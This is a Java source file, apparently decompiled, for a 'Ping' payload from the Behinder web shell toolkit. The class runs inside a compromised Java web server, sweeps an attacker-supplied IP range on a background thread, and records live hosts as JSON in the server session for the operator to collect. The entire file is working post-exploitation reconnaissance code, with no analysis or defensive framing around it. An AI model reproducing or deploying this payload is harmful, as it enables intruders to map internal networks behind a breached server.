package net.rebeyond.behinder.payload.java;

import java.math.BigInteger;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

public class Ping implements Runnable {
   public static String ipList;
   public static String taskID;
   private Object Session;

   public Ping() {
   }

   public Ping(Object session) {
      this.Session = session;
   }

   public void execute(Object request, Object response, Object session) throws Exception {
      (new Thread(new Ping(session))).start();
   }

   private static int ip2int(String ip) throws UnknownHostException {
      int result = 0;
      InetAddress addr = InetAddress.getByName(ip);
      byte[] var3 = addr.getAddress();
      int var4 = var3.length;

      for(int var5 = 0; var5 < var4; ++var5) {
         byte b = var3[var5];
         result = result << 8 | b & 255;
      }

      return result;
   }

   private static String int2ip(int value) throws UnknownHostException {
      byte[] bytes = BigInteger.valueOf((long)value).toByteArray();
      InetAddress address = InetAddress.getByAddress(bytes);
      return address.getHostAddress();
   }

   public static void main(String[] args) {
      String start = ipList.split("-")[0];
      String stop = ipList.split("-")[1];

      try {
         int startValue = ip2int(start);
         int stopValue = ip2int(stop);

         for(int i = ip2int(start); i < ip2int(stop); ++i) {
            String ip = int2ip(i);
            boolean var7 = InetAddress.getByName(ip).isReachable(3000);
         }
      } catch (Exception var8) {
      }

   }

   public void run() {
      String start = ipList.split("-")[0];
      String stop = ipList.split("-")[1];
      Map sessionObj = new HashMap();
      Map scanResult = new HashMap();
      sessionObj.put("running", "true");

      try {
         int startValue = ip2int(start);
         int stopValue = ip2int(stop);

         for(int i = startValue; i <= stopValue; ++i) {
            String ip = int2ip(i);
            boolean isAlive = InetAddress.getByName(ip).isReachable(3000);
            if (isAlive) {
               scanResult.put(ip, "true");
               sessionObj.put("result", this.buildJson(scanResult, false));
            }

            this.sessionSetAttribute(this.Session, taskID, sessionObj);
         }
      } catch (Exception var10) {
         sessionObj.put("result", var10.getMessage());
      }

      sessionObj.put("running", "false");
   }

   private String buildJson(Map entity, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      String version = System.getProperty("java.version");
      sb.append("{");
      Iterator var5 = entity.keySet().iterator();

      while(var5.hasNext()) {
         String key = (String)var5.next();
         sb.append("\"" + key + "\":\"");
         String value = ((String)entity.get(key)).toString();
         if (encode) {
            Class Base64;
            Object Encoder;
            if (version.compareTo("1.9") >= 0) {
               this.getClass();
               Base64 = Class.forName("java.util.Base64");
               Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
               value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
            } else {
               this.getClass();
               Base64 = Class.forName("sun.misc.BASE64Encoder");
               Encoder = Base64.newInstance();
               value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
               value = value.replace("\n", "").replace("\r", "");
            }
         }

         sb.append(value);
         sb.append("\",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("}");
      return sb.toString();
   }

   private void sessionSetAttribute(Object session, String key, Object value) {
      try {
         session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
      } catch (Exception var5) {
      }

   }
}
